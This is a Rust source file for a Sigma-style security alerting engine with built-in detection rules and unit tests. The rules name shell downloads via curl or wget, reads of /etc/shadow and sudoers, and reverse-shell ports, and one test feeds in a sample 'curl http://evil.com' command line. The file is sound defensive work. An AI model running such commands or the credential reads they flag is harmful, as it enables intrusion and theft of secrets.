//! Real-time Alerting Module
//!
//! Provides Sigma/Falco-style rule engine for real-time security alerting.
//! Supports rule-based detection, severity classification, and alert routing.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::{Arc, RwLock};
use std::time::{Duration, Instant};

/// Alert severity levels
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum AlertSeverity {
    Info = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    Critical = 4,
}

impl Default for AlertSeverity {
    fn default() -> Self {
        AlertSeverity::Info
    }
}

impl AlertSeverity {
    pub fn as_str(&self) -> &'static str {
        match self {
            AlertSeverity::Info => "info",
            AlertSeverity::Low => "low",
            AlertSeverity::Medium => "medium",
            AlertSeverity::High => "high",
            AlertSeverity::Critical => "critical",
        }
    }

    pub fn from_str(s: &str) -> Self {
        match s.to_lowercase().as_str() {
            "critical" => AlertSeverity::Critical,
            "high" => AlertSeverity::High,
            "medium" => AlertSeverity::Medium,
            "low" => AlertSeverity::Low,
            _ => AlertSeverity::Info,
        }
    }
}

/// Alert status
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum AlertStatus {
    New,
    Acknowledged,
    InProgress,
    Resolved,
    FalsePositive,
    Suppressed,
}

impl Default for AlertStatus {
    fn default() -> Self {
        AlertStatus::New
    }
}

/// Generated alert
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Alert {
    /// Unique alert ID
    pub id: String,
    /// Timestamp
    pub timestamp: String,
    /// Rule that triggered the alert
    pub rule_id: String,
    /// Rule name
    pub rule_name: String,
    /// Alert title
    pub title: String,
    /// Alert description
    pub description: String,
    /// Severity
    pub severity: AlertSeverity,
    /// Status
    pub status: AlertStatus,
    /// MITRE ATT&CK technique IDs
    #[serde(default)]
    pub mitre_attack: Vec<String>,
    /// Source event ID
    pub source_event_id: String,
    /// Process information
    #[serde(default)]
    pub process: Option<AlertProcess>,
    /// File information
    #[serde(default)]
    pub file: Option<AlertFile>,
    /// Network information
    #[serde(default)]
    pub network: Option<AlertNetwork>,
    /// Container/K8s information
    #[serde(default)]
    pub container: Option<AlertContainer>,
    /// Additional context
    #[serde(default)]
    pub context: HashMap<String, String>,
    /// Tags
    #[serde(default)]
    pub tags: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertProcess {
    pub pid: i64,
    pub ppid: Option<i64>,
    pub name: Option<String>,
    pub exe: Option<String>,
    pub command_line: Option<String>,
    pub uid: Option<i64>,
    pub user: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertFile {
    pub path: Option<String>,
    pub hash: Option<String>,
    pub operation: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertNetwork {
    pub src_ip: Option<String>,
    pub src_port: Option<u16>,
    pub dst_ip: Option<String>,
    pub dst_port: Option<u16>,
    pub protocol: Option<String>,
    pub direction: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AlertContainer {
    pub id: Option<String>,
    pub name: Option<String>,
    pub image: Option<String>,
    pub k8s_namespace: Option<String>,
    pub k8s_pod: Option<String>,
}

/// Detection rule (Sigma-like format)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DetectionRule {
    /// Rule ID
    pub id: String,
    /// Rule name
    pub name: String,
    /// Description
    pub description: String,
    /// Author
    #[serde(default)]
    pub author: Option<String>,
    /// References
    #[serde(default)]
    pub references: Vec<String>,
    /// Severity
    pub severity: AlertSeverity,
    /// Status (experimental, testing, stable)
    #[serde(default)]
    pub status: String,
    /// MITRE ATT&CK mappings
    #[serde(default)]
    pub mitre_attack: Vec<MitreMapping>,
    /// Log source
    pub logsource: LogSource,
    /// Detection logic
    pub detection: Detection,
    /// False positive notes
    #[serde(default)]
    pub falsepositives: Vec<String>,
    /// Tags
    #[serde(default)]
    pub tags: Vec<String>,
    /// Whether rule is enabled
    #[serde(default = "default_true")]
    pub enabled: bool,
}

fn default_true() -> bool {
    true
}

/// MITRE ATT&CK mapping
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MitreMapping {
    pub tactic: String,
    pub technique: String,
    #[serde(default)]
    pub subtechnique: Option<String>,
}

impl MitreMapping {
    pub fn technique_id(&self) -> String {
        if let Some(ref sub) = self.subtechnique {
            format!("{}.{}", self.technique, sub)
        } else {
            self.technique.clone()
        }
    }
}

/// Log source specification
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LogSource {
    /// Category (process_creation, network_connection, file_event, etc.)
    pub category: String,
    /// Product (linux, windows, etc.)
    #[serde(default)]
    pub product: Option<String>,
    /// Service (auditd, sysmon, etc.)
    #[serde(default)]
    pub service: Option<String>,
}

/// Detection logic
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Detection {
    /// Named selections
    #[serde(flatten)]
    pub selections: HashMap<String, Selection>,
    /// Condition expression
    pub condition: String,
}

/// Selection criteria
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Selection {
    /// Simple field match
    Simple(HashMap<String, SelectionValue>),
    /// List of alternatives (OR)
    Alternatives(Vec<HashMap<String, SelectionValue>>),
}

/// Selection value
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum SelectionValue {
    /// Single value
    Single(String),
    /// Multiple values (OR)
    Multiple(Vec<String>),
    /// Numeric value
    Number(i64),
    /// Boolean value
    Boolean(bool),
}

impl SelectionValue {
    /// Check if a value matches this selection
    pub fn matches(&self, value: &str, modifier: &str) -> bool {
        match self {
            SelectionValue::Single(pattern) => Self::match_pattern(value, pattern, modifier),
            SelectionValue::Multiple(patterns) => patterns
                .iter()
                .any(|p| Self::match_pattern(value, p, modifier)),
            SelectionValue::Number(n) => {
                if let Ok(v) = value.parse::<i64>() {
                    v == *n
                } else {
                    false
                }
            }
            SelectionValue::Boolean(b) => {
                let v = value.to_lowercase();
                let parsed = v == "true" || v == "1" || v == "yes";
                parsed == *b
            }
        }
    }

    fn match_pattern(value: &str, pattern: &str, modifier: &str) -> bool {
        let value_lower = value.to_lowercase();
        let pattern_lower = pattern.to_lowercase();

        match modifier {
            "contains" => value_lower.contains(&pattern_lower),
            "startswith" => value_lower.starts_with(&pattern_lower),
            "endswith" => value_lower.ends_with(&pattern_lower),
            "re" => {
                // Simple regex-like matching (production would use regex crate)
                if pattern.contains('*') {
                    let parts: Vec<&str> = pattern_lower.split('*').collect();
                    if parts.len() == 2 {
                        value_lower.starts_with(parts[0]) && value_lower.ends_with(parts[1])
                    } else if parts.len() == 1 && pattern.starts_with('*') {
                        value_lower.ends_with(parts[0])
                    } else if parts.len() == 1 && pattern.ends_with('*') {
                        value_lower.starts_with(parts[0])
                    } else {
                        false
                    }
                } else {
                    value_lower == pattern_lower
                }
            }
            "all" => {
                // All values must be present (for arrays)
                true
            }
            _ => value_lower == pattern_lower,
        }
    }
}

/// Event data for rule evaluation
#[derive(Debug, Clone, Default)]
pub struct EventData {
    pub event_type: String,
    pub fields: HashMap<String, String>,
}

impl EventData {
    pub fn new(event_type: &str) -> Self {
        Self {
            event_type: event_type.to_string(),
            fields: HashMap::new(),
        }
    }

    pub fn with_field(mut self, key: &str, value: &str) -> Self {
        self.fields.insert(key.to_string(), value.to_string());
        self
    }

    pub fn set(&mut self, key: &str, value: &str) {
        self.fields.insert(key.to_string(), value.to_string());
    }

    pub fn get(&self, key: &str) -> Option<&String> {
        self.fields.get(key)
    }
}

/// Rule engine for detection and alerting
pub struct RuleEngine {
    rules: Vec<DetectionRule>,
    /// Alert suppression cache (rule_id + key -> last alert time)
    suppression_cache: Arc<RwLock<HashMap<String, Instant>>>,
    /// Suppression window
    suppression_window: Duration,
    /// Alert handlers
    handlers: Vec<Box<dyn AlertHandler + Send + Sync>>,
}

impl Default for RuleEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl RuleEngine {
    pub fn new() -> Self {
        Self {
            rules: Vec::new(),
            suppression_cache: Arc::new(RwLock::new(HashMap::new())),
            suppression_window: Duration::from_secs(300), // 5 minutes default
            handlers: Vec::new(),
        }
    }

    pub fn with_suppression_window(mut self, window: Duration) -> Self {
        self.suppression_window = window;
        self
    }

    /// Add a detection rule
    pub fn add_rule(&mut self, rule: DetectionRule) {
        self.rules.push(rule);
    }

    /// Load rules from YAML
    pub fn load_yaml(&mut self, yaml: &str) -> Result<(), String> {
        let rule: DetectionRule =
            serde_yaml::from_str(yaml).map_err(|e| format!("YAML parse error: {}", e))?;
        self.add_rule(rule);
        Ok(())
    }

    /// Add an alert handler
    pub fn add_handler(&mut self, handler: Box<dyn AlertHandler + Send + Sync>) {
        self.handlers.push(handler);
    }

    /// Evaluate an event against all rules
    pub fn evaluate(&self, event: &EventData) -> Vec<Alert> {
        let mut alerts = Vec::new();

        for rule in &self.rules {
            if !rule.enabled {
                continue;
            }

            // Check log source
            if !self.matches_logsource(&rule.logsource, event) {
                continue;
            }

            // Evaluate detection logic
            if self.evaluate_detection(&rule.detection, event) {
                // Check suppression
                let suppression_key = self.build_suppression_key(rule, event);
                if self.is_suppressed(&suppression_key) {
                    continue;
                }

                // Generate alert
                let alert = self.generate_alert(rule, event);

                // Update suppression cache
                self.update_suppression(&suppression_key);

                // Dispatch to handlers
                for handler in &self.handlers {
                    handler.handle(&alert);
                }

                alerts.push(alert);
            }
        }

        alerts
    }

    fn matches_logsource(&self, logsource: &LogSource, event: &EventData) -> bool {
        // Map event types to categories
        let category_match = match logsource.category.as_str() {
            "process_creation" => event.event_type == "ProcExec" || event.event_type == "process",
            "file_event" | "file_access" => {
                event.event_type == "FileOpen" || event.event_type == "file"
            }
            "network_connection" => {
                event.event_type == "NetConnect" || event.event_type == "network"
            }
            "authentication" | "privilege_escalation" => {
                event.event_type == "PrivChange" || event.event_type == "auth"
            }
            "dns" => event.event_type == "DnsQuery" || event.event_type == "dns",
            _ => true,
        };

        if !category_match {
            return false;
        }

        // Check product if specified
        if let Some(ref product) = logsource.product {
            if product != "linux" && product != "any" {
                return false;
            }
        }

        true
    }

    fn evaluate_detection(&self, detection: &Detection, event: &EventData) -> bool {
        // Parse and evaluate condition
        let condition = &detection.condition;

        // Simple condition parsing (production would use proper parser)
        // Supports: selection, selection1 and selection2, selection1 or selection2, not selection

        if condition.contains(" and ") {
            let parts: Vec<&str> = condition.split(" and ").collect();
            parts
                .iter()
                .all(|part| self.evaluate_selection_ref(part.trim(), detection, event))
        } else if condition.contains(" or ") {
            let parts: Vec<&str> = condition.split(" or ").collect();
            parts
                .iter()
                .any(|part| self.evaluate_selection_ref(part.trim(), detection, event))
        } else if condition.starts_with("not ") {
            let sel_name = condition.strip_prefix("not ").unwrap().trim();
            !self.evaluate_selection_ref(sel_name, detection, event)
        } else if condition.contains(" and not ") {
            let parts: Vec<&str> = condition.splitn(2, " and not ").collect();
            if parts.len() == 2 {
                self.evaluate_selection_ref(parts[0].trim(), detection, event)
                    && !self.evaluate_selection_ref(parts[1].trim(), detection, event)
            } else {
                false
            }
        } else {
            // Single selection
            self.evaluate_selection_ref(condition.trim(), detection, event)
        }
    }

    fn evaluate_selection_ref(&self, name: &str, detection: &Detection, event: &EventData) -> bool {
        // Handle "all of selection*" pattern
        if name.starts_with("all of ") {
            let pattern = name.strip_prefix("all of ").unwrap();
            let pattern = pattern.trim_end_matches('*');
            return detection
                .selections
                .iter()
                .filter(|(k, _)| k.starts_with(pattern))
                .all(|(_, sel)| self.evaluate_selection(sel, event));
        }

        // Handle "1 of selection*" pattern
        if name.starts_with("1 of ") || name.starts_with("any of ") {
            let pattern = name
                .strip_prefix("1 of ")
                .or_else(|| name.strip_prefix("any of "))
                .unwrap();
            let pattern = pattern.trim_end_matches('*');
            return detection
                .selections
                .iter()
                .filter(|(k, _)| k.starts_with(pattern))
                .any(|(_, sel)| self.evaluate_selection(sel, event));
        }

        // Direct selection reference
        if let Some(selection) = detection.selections.get(name) {
            self.evaluate_selection(selection, event)
        } else {
            false
        }
    }

    fn evaluate_selection(&self, selection: &Selection, event: &EventData) -> bool {
        match selection {
            Selection::Simple(fields) => self.evaluate_fields(fields, event),
            Selection::Alternatives(alternatives) => alternatives
                .iter()
                .any(|fields| self.evaluate_fields(fields, event)),
        }
    }

    fn evaluate_fields(&self, fields: &HashMap<String, SelectionValue>, event: &EventData) -> bool {
        for (key, value) in fields {
            // Parse field name and modifier (e.g., "CommandLine|contains")
            let (field_name, modifier) = if key.contains('|') {
                let parts: Vec<&str> = key.splitn(2, '|').collect();
                (parts[0], parts.get(1).copied().unwrap_or(""))
            } else {
                (key.as_str(), "")
            };

            // Map Sigma field names to our event fields
            let mapped_field = self.map_field_name(field_name);

            if let Some(event_value) = event.get(&mapped_field) {
                if !value.matches(event_value, modifier) {
                    return false;
                }
            } else {
                // Field not present in event
                return false;
            }
        }
        true
    }

    fn map_field_name(&self, sigma_field: &str) -> String {
        // Map Sigma field names to Ritma event fields
        match sigma_field.to_lowercase().as_str() {
            "commandline" | "command_line" => "command_line".to_string(),
            "image" | "exe" | "executable" => "exe".to_string(),
            "parentimage" | "parent_exe" => "parent_exe".to_string(),
            "parentcommandline" | "parent_command_line" => "parent_command_line".to_string(),
            "user" | "username" => "user".to_string(),
            "targetfilename" | "file_path" | "filepath" => "file_path".to_string(),
            "destinationip" | "dst_ip" => "dst_ip".to_string(),
            "destinationport" | "dst_port" => "dst_port".to_string(),
            "sourceip" | "src_ip" => "src_ip".to_string(),
            "sourceport" | "src_port" => "src_port".to_string(),
            "processid" | "pid" => "pid".to_string(),
            "parentprocessid" | "ppid" => "ppid".to_string(),
            _ => sigma_field.to_string(),
        }
    }

    fn build_suppression_key(&self, rule: &DetectionRule, event: &EventData) -> String {
        // Build key from rule ID + relevant event fields
        let mut key = rule.id.clone();

        if let Some(pid) = event.get("pid") {
            key.push_str(&format!(":pid={}", pid));
        }
        if let Some(exe) = event.get("exe") {
            key.push_str(&format!(":exe={}", exe));
        }
        if let Some(dst) = event.get("dst_ip") {
            key.push_str(&format!(":dst={}", dst));
        }

        key
    }

    fn is_suppressed(&self, key: &str) -> bool {
        if let Ok(cache) = self.suppression_cache.read() {
            if let Some(last_time) = cache.get(key) {
                return last_time.elapsed() < self.suppression_window;
            }
        }
        false
    }

    fn update_suppression(&self, key: &str) {
        if let Ok(mut cache) = self.suppression_cache.write() {
            cache.insert(key.to_string(), Instant::now());

            // Cleanup old entries
            let now = Instant::now();
            cache.retain(|_, v| now.duration_since(*v) < self.suppression_window * 2);
        }
    }

    fn generate_alert(&self, rule: &DetectionRule, event: &EventData) -> Alert {
        Alert {
            id: format!("alert_{}", uuid::Uuid::new_v4()),
            timestamp: chrono::Utc::now().to_rfc3339(),
            rule_id: rule.id.clone(),
            rule_name: rule.name.clone(),
            title: rule.name.clone(),
            description: rule.description.clone(),
            severity: rule.severity,
            status: AlertStatus::New,
            mitre_attack: rule.mitre_attack.iter().map(|m| m.technique_id()).collect(),
            source_event_id: event.get("trace_id").cloned().unwrap_or_default(),
            process: self.extract_process_info(event),
            file: self.extract_file_info(event),
            network: self.extract_network_info(event),
            container: self.extract_container_info(event),
            context: event.fields.clone(),
            tags: rule.tags.clone(),
        }
    }

    fn extract_process_info(&self, event: &EventData) -> Option<AlertProcess> {
        let pid = event.get("pid").and_then(|p| p.parse().ok())?;

        Some(AlertProcess {
            pid,
            ppid: event.get("ppid").and_then(|p| p.parse().ok()),
            name: event.get("comm").cloned(),
            exe: event.get("exe").cloned(),
            command_line: event.get("command_line").cloned(),
            uid: event.get("uid").and_then(|u| u.parse().ok()),
            user: event.get("user").cloned(),
        })
    }

    fn extract_file_info(&self, event: &EventData) -> Option<AlertFile> {
        let path = event.get("file_path").cloned();
        let hash = event.get("file_hash").cloned();
        let operation = event.get("file_op").cloned();

        if path.is_some() || hash.is_some() {
            Some(AlertFile {
                path,
                hash,
                operation,
            })
        } else {
            None
        }
    }

    fn extract_network_info(&self, event: &EventData) -> Option<AlertNetwork> {
        let dst_ip = event.get("dst_ip").cloned();
        let dst_port = event.get("dst_port").and_then(|p| p.parse().ok());

        if dst_ip.is_some() || dst_port.is_some() {
            Some(AlertNetwork {
                src_ip: event.get("src_ip").cloned(),
                src_port: event.get("src_port").and_then(|p| p.parse().ok()),
                dst_ip,
                dst_port,
                protocol: event.get("protocol").cloned(),
                direction: event.get("direction").cloned(),
            })
        } else {
            None
        }
    }

    fn extract_container_info(&self, event: &EventData) -> Option<AlertContainer> {
        let id = event.get("container_id").cloned();
        let k8s_namespace = event.get("k8s_namespace").cloned();

        if id.is_some() || k8s_namespace.is_some() {
            Some(AlertContainer {
                id,
                name: event.get("container_name").cloned(),
                image: event.get("container_image").cloned(),
                k8s_namespace,
                k8s_pod: event.get("k8s_pod").cloned(),
            })
        } else {
            None
        }
    }
}

/// Alert handler trait
pub trait AlertHandler {
    fn handle(&self, alert: &Alert);
}

/// Console alert handler (for debugging)
pub struct ConsoleAlertHandler;

impl AlertHandler for ConsoleAlertHandler {
    fn handle(&self, alert: &Alert) {
        eprintln!(
            "[ALERT] {} | {} | {} | {}",
            alert.severity.as_str().to_uppercase(),
            alert.rule_name,
            alert.title,
            alert.timestamp
        );
    }
}

/// File alert handler
pub struct FileAlertHandler {
    path: String,
}

impl FileAlertHandler {
    pub fn new(path: String) -> Self {
        Self { path }
    }
}

impl AlertHandler for FileAlertHandler {
    fn handle(&self, alert: &Alert) {
        if let Ok(json) = serde_json::to_string(alert) {
            if let Ok(mut file) = std::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&self.path)
            {
                use std::io::Write;
                let _ = writeln!(file, "{}", json);
            }
        }
    }
}

/// Built-in detection rules
pub fn builtin_rules() -> Vec<DetectionRule> {
    vec![
        // Suspicious process execution
        DetectionRule {
            id: "ritma-proc-001".to_string(),
            name: "Suspicious Shell Execution".to_string(),
            description: "Detects execution of shell commands that may indicate malicious activity"
                .to_string(),
            author: Some("Ritma".to_string()),
            references: Vec::new(),
            severity: AlertSeverity::Medium,
            status: "stable".to_string(),
            mitre_attack: vec![MitreMapping {
                tactic: "execution".to_string(),
                technique: "T1059".to_string(),
                subtechnique: Some("004".to_string()),
            }],
            logsource: LogSource {
                category: "process_creation".to_string(),
                product: Some("linux".to_string()),
                service: None,
            },
            detection: Detection {
                selections: {
                    let mut m = HashMap::new();
                    let mut sel = HashMap::new();
                    sel.insert(
                        "exe|endswith".to_string(),
                        SelectionValue::Multiple(vec![
                            "/bash".to_string(),
                            "/sh".to_string(),
                            "/zsh".to_string(),
                        ]),
                    );
                    sel.insert(
                        "command_line|contains".to_string(),
                        SelectionValue::Multiple(vec![
                            "curl".to_string(),
                            "wget".to_string(),
                            "base64".to_string(),
                            "eval".to_string(),
                        ]),
                    );
                    m.insert("selection".to_string(), Selection::Simple(sel));
                    m
                },
                condition: "selection".to_string(),
            },
            falsepositives: vec!["Legitimate admin scripts".to_string()],
            tags: vec!["attack.execution".to_string()],
            enabled: true,
        },
        // Sensitive file access
        DetectionRule {
            id: "ritma-file-001".to_string(),
            name: "Sensitive File Access".to_string(),
            description: "Detects access to sensitive system files".to_string(),
            author: Some("Ritma".to_string()),
            references: Vec::new(),
            severity: AlertSeverity::High,
            status: "stable".to_string(),
            mitre_attack: vec![MitreMapping {
                tactic: "credential_access".to_string(),
                technique: "T1003".to_string(),
                subtechnique: Some("008".to_string()),
            }],
            logsource: LogSource {
                category: "file_access".to_string(),
                product: Some("linux".to_string()),
                service: None,
            },
            detection: Detection {
                selections: {
                    let mut m = HashMap::new();
                    let mut sel = HashMap::new();
                    sel.insert(
                        "file_path".to_string(),
                        SelectionValue::Multiple(vec![
                            "/etc/shadow".to_string(),
                            "/etc/gshadow".to_string(),
                            "/etc/sudoers".to_string(),
                        ]),
                    );
                    m.insert("selection".to_string(), Selection::Simple(sel));
                    m
                },
                condition: "selection".to_string(),
            },
            falsepositives: vec!["System administration".to_string()],
            tags: vec!["attack.credential_access".to_string()],
            enabled: true,
        },
        // Outbound connection to suspicious port
        DetectionRule {
            id: "ritma-net-001".to_string(),
            name: "Suspicious Outbound Connection".to_string(),
            description: "Detects outbound connections to commonly abused ports".to_string(),
            author: Some("Ritma".to_string()),
            references: Vec::new(),
            severity: AlertSeverity::Medium,
            status: "stable".to_string(),
            mitre_attack: vec![MitreMapping {
                tactic: "command_and_control".to_string(),
                technique: "T1571".to_string(),
                subtechnique: None,
            }],
            logsource: LogSource {
                category: "network_connection".to_string(),
                product: Some("linux".to_string()),
                service: None,
            },
            detection: Detection {
                selections: {
                    let mut m = HashMap::new();
                    let mut sel = HashMap::new();
                    sel.insert(
                        "dst_port".to_string(),
                        SelectionValue::Multiple(vec![
                            "4444".to_string(),
                            "5555".to_string(),
                            "6666".to_string(),
                            "1337".to_string(),
                            "31337".to_string(),
                        ]),
                    );
                    m.insert("selection".to_string(), Selection::Simple(sel));
                    m
                },
                condition: "selection".to_string(),
            },
            falsepositives: vec!["Legitimate services on these ports".to_string()],
            tags: vec!["attack.c2".to_string()],
            enabled: true,
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_selection_value_matching() {
        let single = SelectionValue::Single("test".to_string());
        assert!(single.matches("test", ""));
        assert!(single.matches("TEST", "")); // Case insensitive
        assert!(!single.matches("other", ""));

        let multiple = SelectionValue::Multiple(vec!["a".to_string(), "b".to_string()]);
        assert!(multiple.matches("a", ""));
        assert!(multiple.matches("b", ""));
        assert!(!multiple.matches("c", ""));

        // Contains modifier
        let pattern = SelectionValue::Single("curl".to_string());
        assert!(pattern.matches("curl http://example.com", "contains"));
        assert!(!pattern.matches("wget http://example.com", "contains"));

        // Startswith modifier
        let prefix = SelectionValue::Single("/bin/".to_string());
        assert!(prefix.matches("/bin/bash", "startswith"));
        assert!(!prefix.matches("/usr/bin/bash", "startswith"));
    }

    #[test]
    fn test_rule_evaluation() {
        let mut engine = RuleEngine::new();

        let rule = DetectionRule {
            id: "test-001".to_string(),
            name: "Test Rule".to_string(),
            description: "Test".to_string(),
            author: None,
            references: Vec::new(),
            severity: AlertSeverity::High,
            status: "stable".to_string(),
            mitre_attack: Vec::new(),
            logsource: LogSource {
                category: "process_creation".to_string(),
                product: None,
                service: None,
            },
            detection: Detection {
                selections: {
                    let mut m = HashMap::new();
                    let mut sel = HashMap::new();
                    sel.insert(
                        "exe".to_string(),
                        SelectionValue::Single("/bin/bash".to_string()),
                    );
                    m.insert("selection".to_string(), Selection::Simple(sel));
                    m
                },
                condition: "selection".to_string(),
            },
            falsepositives: Vec::new(),
            tags: Vec::new(),
            enabled: true,
        };

        engine.add_rule(rule);

        // Matching event
        let event = EventData::new("ProcExec")
            .with_field("exe", "/bin/bash")
            .with_field("pid", "1234");

        let alerts = engine.evaluate(&event);
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].rule_id, "test-001");

        // Non-matching event
        let event2 = EventData::new("ProcExec")
            .with_field("exe", "/bin/ls")
            .with_field("pid", "1234");

        let alerts2 = engine.evaluate(&event2);
        assert!(alerts2.is_empty());
    }

    #[test]
    fn test_builtin_rules() {
        let rules = builtin_rules();
        assert!(!rules.is_empty());

        for rule in &rules {
            assert!(!rule.id.is_empty());
            assert!(!rule.name.is_empty());
            assert!(rule.enabled);
        }
    }

    #[test]
    fn test_yaml_rule_loading() {
        let yaml = r#"
id: test-yaml-001
name: YAML Test Rule
description: Test rule loaded from YAML
severity: high
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    exe|endswith: /bash
    command_line|contains: curl
  condition: selection
tags:
  - test
"#;

        let mut engine = RuleEngine::new();
        engine.load_yaml(yaml).unwrap();

        let event = EventData::new("ProcExec")
            .with_field("exe", "/bin/bash")
            .with_field("command_line", "bash -c 'curl http://evil.com'")
            .with_field("pid", "1234");

        let alerts = engine.evaluate(&event);
        assert_eq!(alerts.len(), 1);
    }

    #[test]
    fn test_alert_suppression() {
        let mut engine = RuleEngine::new().with_suppression_window(Duration::from_millis(100));

        let rule = DetectionRule {
            id: "supp-001".to_string(),
            name: "Suppression Test".to_string(),
            description: "Test".to_string(),
            author: None,
            references: Vec::new(),
            severity: AlertSeverity::Low,
            status: "stable".to_string(),
            mitre_attack: Vec::new(),
            logsource: LogSource {
                category: "process_creation".to_string(),
                product: None,
                service: None,
            },
            detection: Detection {
                selections: {
                    let mut m = HashMap::new();
                    let mut sel = HashMap::new();
                    sel.insert(
                        "exe".to_string(),
                        SelectionValue::Single("test".to_string()),
                    );
                    m.insert("selection".to_string(), Selection::Simple(sel));
                    m
                },
                condition: "selection".to_string(),
            },
            falsepositives: Vec::new(),
            tags: Vec::new(),
            enabled: true,
        };

        engine.add_rule(rule);

        let event = EventData::new("ProcExec")
            .with_field("exe", "test")
            .with_field("pid", "1234");

        // First evaluation should generate alert
        let alerts1 = engine.evaluate(&event);
        assert_eq!(alerts1.len(), 1);

        // Second evaluation should be suppressed
        let alerts2 = engine.evaluate(&event);
        assert!(alerts2.is_empty());

        // Wait for suppression to expire
        std::thread::sleep(Duration::from_millis(150));

        // Third evaluation should generate alert again
        let alerts3 = engine.evaluate(&event);
        assert_eq!(alerts3.len(), 1);
    }
}
